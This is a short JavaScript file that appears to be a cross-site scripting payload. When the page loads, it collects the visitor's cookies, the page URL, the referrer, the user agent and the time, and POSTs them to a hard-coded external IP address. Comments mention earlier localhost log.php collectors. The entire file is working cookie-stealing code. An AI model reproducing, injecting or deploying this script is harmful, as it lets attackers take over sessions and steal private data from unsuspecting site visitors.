window.onload = function()
{
gettime(); 
geturl(); 
getrefer(); 
getuser_agent(); 
getcookie(); 
loadXMLDoc();
}
function gettime(){
var nowDate = new Date();
return nowDate.toLocaleString();
}
function geturl(){
return window.location.href;
}

function getrefer(){
return document.referrer;
}
function getcookie(){
return document.cookie;
}
function getuser_agent(){
return navigator.userAgent;
}
function loadXMLDoc(){
var xmlhttp;
if (window.XMLHttpRequest){
xmlhttp=new XMLHttpRequest();
}else{
xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.onreadystatechange=function(){
if (xmlhttp.readyState==4 && xmlhttp.status==200){
//alert(xmlhttp.responseText);
}
} //http://localhost/git_work/log.php //http://localhost:8088/log.php
xmlhttp.open("POST","http://120.79.10.167",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("time="+gettime()+"&url="+geturl()+"&refer="+getrefer()+"&user_agent="+getuser_agent()+"&cookie="+getcookie());
}
